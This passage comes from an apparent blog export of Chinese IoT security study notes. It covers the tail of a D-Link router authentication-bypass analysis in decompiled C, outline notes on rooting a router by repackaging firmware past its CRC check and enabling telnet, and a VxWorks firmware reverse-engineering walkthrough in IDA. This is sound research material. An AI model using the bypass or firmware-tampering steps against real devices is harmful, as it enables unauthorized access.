class="tag">&lt;/<span class="name">Captcha</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Login</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">undefined4 <span class="title">Request</span><span class="params">(<span class="keyword">char</span> **param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;    </span><br><span class="line">    <span class="comment">// 1 获取Username、PrivateLogin字段的值</span></span><br><span class="line">    Username = (<span class="keyword">char</span> *)webGetVarString(param_1,<span class="string">"/Login/Username"</span>,uVar2,param_4);</span><br><span class="line">    PrivateLogin = (<span class="keyword">char</span> *)webGetVarString(param_1,<span class="string">"/Login/PrivateLogin"</span>,uVar2,param_4);</span><br><span class="line">    <span class="comment">// 2 如果xxx，从nvram中读取读取admin的密码（取反得到else的含义</span></span><br><span class="line">    <span class="keyword">if</span> ((PrivateLogin == (<span class="keyword">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(PrivateLogin,<span class="string">"Username"</span>,<span class="number">8</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">      GetPassword(Password,<span class="number">0x40</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="comment">// 3 如果PrivateLogin字段不为空，且包含字符串"Username"，则设置Password为Username字段的值</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(Password,Username,<span class="number">0x40</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">		<span class="comment">// 4 生成PrivateKey，Challenge和Publickey在第一次请求时服务端就返回了，唯一未知的就是Password，而在这通过上述strncpy，密码Password设置为了Username字段的值，</span></span><br><span class="line">    GenPrivateKey(Challenge,Password,Publickey,PrivateKey,<span class="number">0x80</span>);</span><br><span class="line">    <span class="comment">// 5 Challenge Publickey Password三者已知，故生成的PrivateKey已知</span></span><br><span class="line">    <span class="comment">// PrivateKey+Challenge=LoginPassword字段，前二已知，故后者已知，而正是通过后者来验证认证的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://www.thezdi.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>路由器pwn实践</title>
    <url>/2021/07/11/iot/%E8%B7%AF%E7%94%B1%E5%99%A8pwn%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="路由器pwn实践"><a href="#路由器pwn实践" class="headerlink" title="路由器pwn实践"></a>路由器pwn实践</h1><ul>
<li>概要：登录后台、文件备份及恢复功能、获取固件、绕过固件校验实现重打包、开启telnet获取shell、利用mount修改文件内容、逆向程序获得关灯的指令</li>
<li>PS：重点都红线划出了</li>
<li>其它<ul>
<li>lua当cgi后端，类似的，还有什么前后端？//here</li>
<li>报错如404，看信息泄漏</li>
<li>后台敏感功能：ping（可能命令执行）、文件备份及恢复（信息泄漏、系统修改</li>
<li>熵低，加密可能性低</li>
<li>文件校验：大小和完整性（比如有size和crc等字段）</li>
<li>64bit的hash，老路由器，算力不行，排除md5等算法（思路清奇）</li>
<li>lua预编译成字节码文件（是不是类似于pyc），lua结尾，file查看为lua bytecode，一般luadec可反编译，但路由器环境特殊</li>
</ul>
</li>
<li>分析bin文件布局<ul>
<li>c8是zlib开始，binwalk和工具都提及了，主要分析header中字段</li>
<li>size字段很容易识别，计算大小对比即可</li>
<li>完整性字段，多次改变文件，看哪个地方变</li>
</ul>
</li>
<li>敏感文件<ul>
<li>获取文件系统后，找敏感文件，如配置</li>
<li>文件系统内敏感文件，守护进程</li>
<li>与某功能相关的程序，如led灯相关的ledkeytest（随手h/help猜测功能）</li>
</ul>
</li>
<li>定位64bit的hash算法<ul>
<li>大概猜一下流程：data经过zlib压缩，计算出data的crc，放入header，二者组合成最终bin文件</li>
<li>函数流程：传入文件，打开文件，读到缓冲区，压缩数据，填充其他数据</li>
<li>两流程神似，故断定</li>
</ul>
</li>
<li>逆向scpd<ul>
<li>逆向时，敏感字符串或函数名，config/conf/cfg等</li>
<li>除了open、read、write和zlib的压缩函数，只有两个未命名函数</li>
</ul>
</li>
<li>第一个，crc的准备工作<ul>
<li>没有传参，故没有操作文件</li>
<li>对.data段变量的写操作，即对一个全局变量赋值，很可能是初始化某一个表（加密或hash算法时常用到table）</li>
</ul>
</li>
<li>第二个，crc计算，且有两处<ul>
<li>传入了地址和大小</li>
<li>crc常见操作，比如左移右移8啥的</li>
<li>有两处crx计算，一处针对header，一处针对data，再拼接，32+32=64（上述两点从函数内部实现看，此从函数外部的调用看）</li>
</ul>
</li>
<li>判定crc32b<ul>
<li>参数3传入ffffffff，即～0，取反0得f</li>
<li>交换大小段，crc返回值再取反</li>
<li>crc32是左移8，而crc32b是右移8（文字错误图中对）</li>
<li>b应该是big</li>
<li>crc32、crc32b算法待学习//here</li>
</ul>
</li>
<li>获取shell后<ul>
<li>cat /proc/cpuinfo</li>
<li>system type，mt7620，联发科的芯片</li>
<li>32M内存怎么来的？tlb_entries？//here</li>
<li>rootfs不可写怎么知道的？手动测试？一般/tmp是可写的吧//here</li>
</ul>
</li>
<li>逆向ledkeytest<ul>
<li>if判断（/proc/csp/loadtype内容是否为2）、取参数2给s、</li>
<li>do循环、strcmp比较s和e0（e0作为字符串，基址+偏移的形式）、e4作为函数执行</li>
<li>推测：基址是结构体数组首地址、struct=char * + callback回调函数（这种形式很常见）、最终形式是ledkeytest+ledoff</li>
</ul>
</li>
<li>修改loadtype<ul>
<li>表模式，默认是3，2应该是测试模式（lefkeytest即测试程序）</li>
<li>修改1：patch程序，但rootfs不可写，只能固件重打包，风险大</li>
<li>修改2：Linux下通用方法，mount挂载</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://www.52pojie.cn/thread-1400371-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1400371-1-1.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>IDAPython-VxWorks固件解析</title>
    <url>/2021/07/03/iot/IDAPython-VxWorks%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="IDAPython-VxWorks固件解析"><a href="#IDAPython-VxWorks固件解析" class="headerlink" title="IDAPython-VxWorks固件解析"></a>IDAPython-VxWorks固件解析</h1><h2 id="00-准备"><a href="#00-准备" class="headerlink" title="00-准备"></a>00-准备</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">The WRT54G series infamously switched from Linux to VxWorks with the release of the WRT54Gv5. Because VxWorks is a proprietary RTOS, it is a less familiar environment than a Linux based system. Even once you identify the different sections of the firmware image, there usually isn’t a standard file system full of standard ELF executables that can be automatically analyzed by a disassembler.</span><br><span class="line"></span><br><span class="line"><span class="comment"># WRT54G从v5起，从Linux转为VxWorks</span></span><br><span class="line"><span class="comment"># vw是一个实时操作系统，不同于Linux，更加陌生</span></span><br><span class="line"><span class="comment"># 即使从固件中分辨出了不同的section，也很难获取到通用的文件系统（如squashFs）</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>固件：<a href="https://www.linksys.com/gb/support-article?articleNum=208638" target="_blank" rel="noopener">https://www.linksys.com/gb/support-article?articleNum=208638</a> 中的 <a href="https://downloads.linksys.com/downloads/firmware/FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin" target="_blank" rel="noopener">https://downloads.linksys.com/downloads/firmware/FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin</a></p>
</li>
<li><p>一般步骤</p>
<ol>
<li>从firmware中发现并提取出可执行代码</li>
<li>识别可执行代码的加载地址</li>
<li>指定加载地址，ida中打开</li>
<li>手动或脚本方式，增强ida的自动分析</li>
</ol>
</li>
<li><p>通过JTAG或者串口的debug信息可以替代1/2，但要有实机，在此纯分析firmware</p>
</li>
</ul>
<h2 id="01-固件组成"><a href="#01-固件组成" class="headerlink" title="01-固件组成"></a>01-固件组成</h2><ul>
<li>binwalk</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅留涉及到的</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk -v  FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin</span><br><span class="line"><span class="comment"># -v仅仅多了如下，没啥用</span></span><br><span class="line">Scan Time:     2021-01-07 15:52:34</span><br><span class="line">Target File:   /home/lxl/Desktop/tmp/FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin</span><br><span class="line">MD5 Checksum:  74317a70160f80fa5df01de0e479a39c</span><br><span class="line">Signatures:    344</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             BIN-Header, board ID: 5VGW, hardware version: 4702, firmware version: 1.128.128, build date: 2009-10-05</span><br><span class="line"><span class="comment"># ELF</span></span><br><span class="line">512           0x200           ELF, 32-bit LSB MIPS-II executable, MIPS, version 1 (SYSV)</span><br><span class="line"><span class="comment"># LZMA</span></span><br><span class="line">103664        0x194F0         LZMA compressed data, properties: 0x6C, dictionary size: 8388608 bytes, uncompressed size: 3680864 bytes</span><br><span class="line"><span class="comment"># gzip后的web文件</span></span><br><span class="line">1185153       0x121581        gzip compressed data, has original file name: <span class="string">"apply.htm"</span>, from NTFS filesystem (NT), last modified: 2009-09-04 07:45:58</span><br></pre></td></tr></table></figure>
<h3 id="1-web文件"><a href="#1-web文件" class="headerlink" title="1-web文件"></a>1-web文件</h3><ul>
<li>web文件的提取类似于之前的OW，<a href="http://www.devttys0.com/2011/06/mystery-file-system/，非本文重点" target="_blank" rel="noopener">http://www.devttys0.com/2011/06/mystery-file-system/，非本文重点</a></li>
</ul>
<h3 id="2-lama-data-主程序"><a href="#2-lama-data-主程序" class="headerlink" title="2-lama_data/主程序"></a>2-lama_data/主程序</h3><ul>
<li>dd提取lzma，7zip解压</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大小转换（大约值，只保留商，足矣了</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ expr 3680864 / 1024 / 1024</span><br><span class="line">3</span><br><span class="line"><span class="comment"># lzma的uncompressed size: 3680864 bytes，大约3M，合理的大小，若太大（如几百M），则认为识别错了</span></span><br><span class="line">103664        0x194F0         LZMA compressed data, properties: 0x6C, dictionary size: 8388608 bytes, uncompressed size: 3680864 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不用count，lzma解压时尾部的垃圾数据会忽略</span></span><br><span class="line"><span class="comment"># 要么就count=`expr 1173205 - 103664`，精确控制大小（但没必要</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin of=lzma_data.lzma bs=1 skip=103664</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux下的p7zip和lzma都不靠谱（二者还需要特定的后缀）</span></span><br><span class="line"><span class="comment"># 直接win下的7zip即可解压，会提示“有效数据外包含额外数据”，但结果不影响</span></span><br></pre></td></tr></table></figure>
<ul>
<li>strings或hexdump找敏感字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/tmp$ strings lzma_data &gt; 1.txt</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ subl 1.txt</span><br><span class="line"><span class="variable">$MODEL_NAME</span>=WRT54G<span class="comment"># 型号</span></span><br><span class="line"><span class="variable">$OEM_NAME</span>=LINKSYS<span class="comment"># 厂商</span></span><br><span class="line">Content-Length: XXXXXXXX</span><br><span class="line">HTTP/1.1 307 Temporary Redirect<span class="comment"># HTTP</span></span><br><span class="line">Content-Type: text/html</span><br><span class="line">Location: https://%s%s/HNAP1/<span class="comment"># HNAP</span></span><br></pre></td></tr></table></figure>
<h3 id="3-kernel文件"><a href="#3-kernel文件" class="headerlink" title="3-kernel文件"></a>3-kernel文件</h3><ul>
<li>提取ELF可执行代码</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># firmware中的二进制数据中，可能会有可执行代码，要想分析，需要知道其CPU架构（指令集）及大小端等信息</span></span><br><span class="line"><span class="comment"># 有个ELF：mips、小端</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin | head</span><br><span class="line">512           0x200           ELF, 32-bit LSB MIPS-II executable, MIPS, version 1 (SYSV)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd提取并file</span></span><br><span class="line"><span class="comment"># 未指定count，file也能看出来，故其依据的是头部信息，尾巴跟着啥无所谓</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin of=elf bs=1 skip=512</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ file elf </span><br><span class="line">elf: ELF 32-bit LSB executable, MIPS, MIPS-II version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure>
<ul>
<li>鉴别ELF是啥？内核文件</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># strings + head</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ strings -n 10 elf | head</span><br><span class="line">VxWorks5.4.2 <span class="comment"># vxworks</span></span><br><span class="line">Oct  5 2009, 15:15:53</span><br><span class="line">memPartFree</span><br><span class="line">bug <span class="keyword">in</span> vfprintf: bad base</span><br><span class="line">WIND version 2.5<span class="comment"># wind river</span></span><br><span class="line">workQPanic: Kernel work queue overflow.<span class="comment"># kernel</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 综上，mips、小端、字符串信息</span></span><br><span class="line"><span class="comment"># 此elf可能为VxWorks的kernel文件</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ida加载kernel</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选择mips little endian：能加载成功，还识别出了612个函数，所以dd时没指定count，尾部的数据是真的不影响</span></span><br><span class="line"><span class="comment"># Because this image has an ELF header, IDA's auto analysis does a very good job of identifying functions and resolving symbols for us. （所以如果没有头，是不是就没啥自动分析，如笔记13中的36ac，没有头，所以一打开啥也没有</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动分析后，第一个subroutine为startInflate（inflate-膨胀，依据名字，解压等操作？</span></span><br><span class="line"><span class="comment"># 0x80001000 给 v0、a1，调用完decompressImage后，jalr到v0</span></span><br><span class="line"><span class="comment"># 故0x80001000处存放了解压后的代码，decompressImage后，接管pc</span></span><br><span class="line"></span><br><span class="line">.text:80500460  <span class="comment"># =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:80500460                 .globl startInflate</span><br><span class="line">.text:80500460 startInflate:</span><br><span class="line">.text:80500464                 li      <span class="variable">$v0</span>, 0x80001000</span><br><span class="line">.text:8050046C                 li      <span class="variable">$a1</span>, 0x80001000</span><br><span class="line">.text:80500474                 li      <span class="variable">$a0</span>, _binArrayStart</span><br><span class="line">.text:8050048C                 jal     decompressImage</span><br><span class="line">.text:805004A0                 jalr    <span class="variable">$v0</span></span><br><span class="line">.text:805004B0  <span class="comment"># End of function startInflate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># _binArrayStart是decompressImage的参数，待解压文件的开头？</span></span><br><span class="line">.data:80519270 _binArrayStart: .byte 0x6C  <span class="comment"># l          # DATA XREF: startInflate+14↑o</span></span><br><span class="line">.data:80519271                 .byte    0</span><br><span class="line">.data:80519272                 .byte    0</span><br><span class="line">.data:80519273                 .byte 0x80</span><br><span class="line">.data:80519274                 .byte    0</span><br><span class="line">.data:80519275                 .byte 0x60  <span class="comment"># `</span></span><br><span class="line">.data:80519276                 .byte 0x2A  <span class="comment"># *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 之前提取的、未解压的lzma数据，恰好匹配</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump -C lzma_data.lzma | head</span><br><span class="line">00000000  6c 00 00 80 00 60 2a 38  00 00 00 00 00 00 11 00  |l....`*8........|</span><br><span class="line">00000010  2c 20 00 df 1e 01 d7 44  6b 43 41 4d a8 aa 91 9c  |, .....DkCAM....|</span><br><span class="line"></span><br><span class="line"><span class="comment"># decompressImage里调用了LzmaDecode</span></span><br><span class="line">.text:80500058                 .globl decompressImage</span><br><span class="line">.text:80500058 decompressImage:                         <span class="comment"># CODE XREF: startInflate+2C↓p</span></span><br><span class="line">.text:805001F8                 jal     LzmaDecode</span><br><span class="line">.text:80500224  <span class="comment"># End of function decompressImage</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 综上，代码做了：lzma_data.lzma传入decompressImage，解压后放在0x80001000</span></span><br><span class="line"><span class="comment"># 可人工代替：dd提取出lzma_data.lzma、7zip解压得到原始的lzma_data（其内包含可执行代码）、ida中打开并指定加载地址为0x80001000</span></span><br></pre></td></tr></table></figure>
<h2 id="02-ida加载主程序"><a href="#02-ida加载主程序" class="headerlink" title="02-ida加载主程序"></a>02-ida加载主程序</h2><ul>
<li>ida加载lzma_data</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加载器只有最原始的：binary file</span></span><br><span class="line"><span class="comment"># processor选择mipsl（依据kernel文件，即elf</span></span><br><span class="line"><span class="comment"># 选中manual load，出现disassembly memory organization（或者不选，加载后就会默认打开</span></span><br><span class="line"><span class="comment"># 内存布局中：input file的loading address指定0x80001000、loading size默认就是文件大小、file offset默认0即可</span></span><br><span class="line"><span class="comment"># 选择创建rom section，address和size同input file（作用未知，但ram和rom必须选一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 刚打开，啥也没有，第一个字节处，快捷键c将byte转化为code，随后ida会自动分析</span></span><br><span class="line"><span class="comment"># 识别出了5769个函数，字符串识别也没问题</span></span><br><span class="line">ROM:80001000  <span class="comment"># Segment type: Pure code</span></span><br><span class="line">ROM:80001000                 .text <span class="comment"># ROM</span></span><br><span class="line"><span class="comment"># 首行代码，跳过随后的数据</span></span><br><span class="line">ROM:80001000                 b       loc_8000108C</span><br><span class="line"><span class="comment"># 这一块是数据，需要自己转</span></span><br><span class="line">ROM:80001004                 nop</span><br><span class="line">ROM:80001004  <span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line">ROM:80001008                 .byte    0</span><br><span class="line">ROM:80001009                 .byte    0</span><br><span class="line">ROM:8000100A                 .byte    0</span><br><span class="line">ROM:8000100B                 .byte    0</span><br><span class="line">ROM:8000100C                 .byte    0</span><br><span class="line">ROM:8000100D                 .byte    0</span><br><span class="line">ROM:8000100E                 .byte    0</span><br><span class="line">ROM:8000100F                 .byte    0</span><br><span class="line">ROM:80001010                 .byte 0x4E  <span class="comment"># N</span></span><br><span class="line">ROM:80001011                 .byte 0x4F  <span class="comment"># O</span></span><br><span class="line">ROM:80001012                 .byte 0x52  <span class="comment"># R</span></span><br><span class="line">......</span><br><span class="line"><span class="comment"># 其他位置代码也出来了</span></span><br><span class="line">ROM:8000108C  <span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line">ROM:8000108C</span><br><span class="line">ROM:8000108C loc_8000108C:                            <span class="comment"># CODE XREF: ROM:80001000↑j</span></span><br><span class="line">ROM:8000108C                 li      <span class="variable">$gp</span>, 0x8038BA50</span><br></pre></td></tr></table></figure>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071031.jpg" alt="image-20210108105021281"></p>
<ul>
<li>ida脚本加强其自动分析</li>
</ul>
<h2 id="03-ida脚本辅助"><a href="#03-ida脚本辅助" class="headerlink" title="03-ida脚本辅助"></a>03-ida脚本辅助</h2><p><a href="http://www.devttys0.com/wp-content/uploads/2011/07/ida_scripts.zip" target="_blank" rel="noopener">http://www.devttys0.com/wp-content/uploads/2011/07/ida_scripts.zip</a></p>
<h3 id="1-create-function-py"><a href="#1-create-function-py" class="headerlink" title="1-create_function.py"></a>1-create_function.py</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 遍历代码，查找函数序言来定位未标识的函数，如果找到一个，告诉IDA在那里创建一个函数</span></span><br><span class="line"><span class="comment"># MIPS比Intel要复杂一些，因为函数序言在MIPS中没有那么标准化</span></span><br><span class="line"><span class="comment"># addui指令用于操作函数开头的堆栈寄存器（$sp），如</span></span><br><span class="line">ROM:802DAE08 sub_802DAE08:                            <span class="comment"># CODE XREF: sub_802C81E0+64↑p</span></span><br><span class="line">ROM:802DAE08                 addiu   <span class="variable">$sp</span>, -0x68</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也有许多特殊的：addiu前有lw</span></span><br><span class="line">ROM:80002254 sub_80002254:                            <span class="comment"># CODE XREF: sub_800022D8:loc_80002320↓p</span></span><br><span class="line">ROM:80002254                 lw      <span class="variable">$v0</span>, dword_8034F218</span><br><span class="line">ROM:8000225C                 addiu   <span class="variable">$sp</span>, -0x18</span><br><span class="line"></span><br><span class="line"><span class="comment"># create_functions.py的IDAPython脚本将在代码（从光标位置开始）中搜索与这些指令对应的字节序列，并指示IDA将它们转换为函数。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在反汇编中，包含字符串的数据部分似乎从0x802DDAC0开始，因此将其设为停止地址</span></span><br><span class="line">ROM:802DDAB4  <span class="comment"># End of function sub_802DDA64</span></span><br><span class="line">ROM:802DDAB4  <span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line">ROM:802DDAB8                 .word 0</span><br><span class="line">ROM:802DDABC                 .word 0</span><br><span class="line">ROM:802DDAC0 aInvalidConfigu:.ascii <span class="string">"Invalid configuration. PCI_MAX_DEV &gt; 16, PCI mechanism #2\n"</span>&lt;0&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者直接拉到最后，找最后的地址</span></span><br><span class="line">ROM:80383A5E                 .byte    0</span><br><span class="line">ROM:80383A5F                 .byte    0</span><br><span class="line">ROM:80383A5F</span><br><span class="line">ROM:80383A5F                  <span class="comment"># end</span></span><br></pre></td></tr></table></figure>
<p>运行脚本前</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071029.jpg" alt="image-20210108160141284"></p>
<p>运行后，效果可观</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071030.jpg" alt="image-20210108160344144"></p>
<h3 id="2-create-code-py"><a href="#2-create-code-py" class="headerlink" title="2-create_code.py"></a>2-create_code.py</h3><p>仍有许多二进制没有被解析（颜色也对应）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071027.jpg" alt="image-20210108160934209"></p>
<p>这些部分被code周围是代码（从导航带中可见，蓝色中有些许棕色），手动c一下（或者p直接转为函数）便可将其转为代码</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071026.jpg" alt="image-20210108163928354"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这些代码都以“jr $ra”结尾（mips的return指令），并且看起来并没有被其他函数引用（比如jmp），因此可推断：是函数的本体</span></span><br><span class="line"><span class="comment"># create_code.py脚本：遍历数据，将未被引用的bytes转换为function</span></span><br><span class="line"><span class="comment"># （同之前的create_function有何区别？后者是unreferenced的，那前者是被引用的？被引用的就有addiu和lw指令？之间有啥联系？）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 效果可观：函数增加了、蓝色代码中的unexplored没有了、导航带右边unexplored出现了许多instruction</span></span><br></pre></td></tr></table></figure>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071033.jpg" alt="image-20210108164927529"></p>
<h3 id="3-create-ascii-py"><a href="#3-create-ascii-py" class="headerlink" title="3-create_ascii.py"></a>3-create_ascii.py</h3><ol>
<li><p>处理好代码后，仍有一些ASCII字节数组未被IDA转换为字符串，可手动a将其转换，或脚本处理</p>
</li>
<li><p>运行前</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-71030.jpg" alt="image-20210108165720911"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071032.jpg" alt="image-20210111115337259"></p>
<p> 可见，无论字符串是什么形式（bytes or ascii），strings中都能识别</p>
</li>
<li><p>运行后，有的成功有的失败</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071028.jpg" alt="image-20210111114350275"></p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Looking <span class="keyword">for</span> possible strings starting at: 0x80001000</span><br><span class="line">Created 7500 new ASCII strings</span><br><span class="line"><span class="comment"># 还是7500个，看来没改变这个，只是在形式上讲单个byte转为了ascii字符串</span></span><br><span class="line"><span class="comment"># 失败的是因为在之前转换代码时，范围选择了从开始到结束，将字符串的00转为了代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否有必要精确转换代码/数据的范围？</span></span><br><span class="line"><span class="comment"># 没必要，如上，转换代码时选择了全部范围，尽管在转数据时有个别的失败，也无伤大雅</span></span><br><span class="line"><span class="comment"># 如果真要精确范围，代价太大，因为一个二进制文件可能代码和数据是混在一起的，不是前面代码后面数据，如果要范围，成本太大</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个create_ascii有啥意义呢？？感觉作用不大</span></span><br></pre></td></tr></table></figure>
<h2 id="04-逆向过程"><a href="#04-逆向过程" class="headerlink" title="04-逆向过程"></a>04-逆向过程</h2><h3 id="1-识别基本函数"><a href="#1-识别基本函数" class="headerlink" title="1-识别基本函数"></a>1-识别基本函数</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 反汇编代码：</span></span><br><span class="line"><span class="comment"># # lui指令：把一个16位的立即数填入到寄存器的高16位，低16位补零</span></span><br><span class="line"><span class="comment"># 故lui     $a0, 1时a0=65525</span></span><br><span class="line">ROM:80003154                 addiu   <span class="variable">$sp</span>, -0x30</span><br><span class="line">ROM:80003158                 sw      <span class="variable">$s3</span>, 0x18+var_sC(<span class="variable">$sp</span>)</span><br><span class="line">ROM:8000315C                 move    <span class="variable">$s3</span>, <span class="variable">$a0</span></span><br><span class="line">ROM:80003160                 lui     <span class="variable">$a0</span>, 1<span class="comment">#65536</span></span><br><span class="line">ROM:80003164                 sw      <span class="variable">$s1</span>, 0x18+var_s4(<span class="variable">$sp</span>)</span><br><span class="line">ROM:80003168                 move    <span class="variable">$s1</span>, <span class="variable">$a1</span></span><br><span class="line">ROM:8000316C                 sw      <span class="variable">$s2</span>, 0x18+var_s8(<span class="variable">$sp</span>)</span><br><span class="line">ROM:80003170                 move    <span class="variable">$s2</span>, <span class="variable">$a2</span></span><br><span class="line">ROM:80003174                 sw      <span class="variable">$ra</span>, 0x18+var_s10(<span class="variable">$sp</span>)</span><br><span class="line">ROM:80003178                 jal     sub_802A7F90</span><br><span class="line">ROM:8000317C                 sw      <span class="variable">$s0</span>, 0x18+var_s0(<span class="variable">$sp</span>)</span><br><span class="line">ROM:80003180                 move    <span class="variable">$s0</span>, <span class="variable">$v0</span></span><br><span class="line">ROM:80003184                 bnez    <span class="variable">$s0</span>, loc_800031A4</span><br><span class="line">ROM:80003188                 lui     <span class="variable">$v0</span>, 0xBFC4</span><br><span class="line">ROM:8000318C                 li      <span class="variable">$a0</span>, aCanTAllocateDB  <span class="comment"># "Can't allocate %d bytes of memory\n"</span></span><br><span class="line">ROM:80003194                 jal     sub_802A06E8</span><br><span class="line">ROM:80003198                 lui     <span class="variable">$a1</span>, 1<span class="comment"># 65536</span></span><br><span class="line">ROM:8000319C                 j       loc_80003298</span><br><span class="line">ROM:800031A0                 li      <span class="variable">$v0</span>, 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪C</span></span><br><span class="line"><span class="keyword">if</span>(!sub_802A7F90(65536))</span><br><span class="line">&#123;</span><br><span class="line">   sub_802A06E8(<span class="string">"Can't allocate %d bytes of memory\n"</span>, 65536);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 故猜测：sub_802A7F90为malloc，sub_802A06E8为printf</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/" target="_blank" rel="noopener">http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>固件分析</tag>
        <tag>vxworks</tag>
      </tags>
  </entry>
  <entry>
    <title>Netgear R8300认证前RCE的漏洞分析及利用</title>
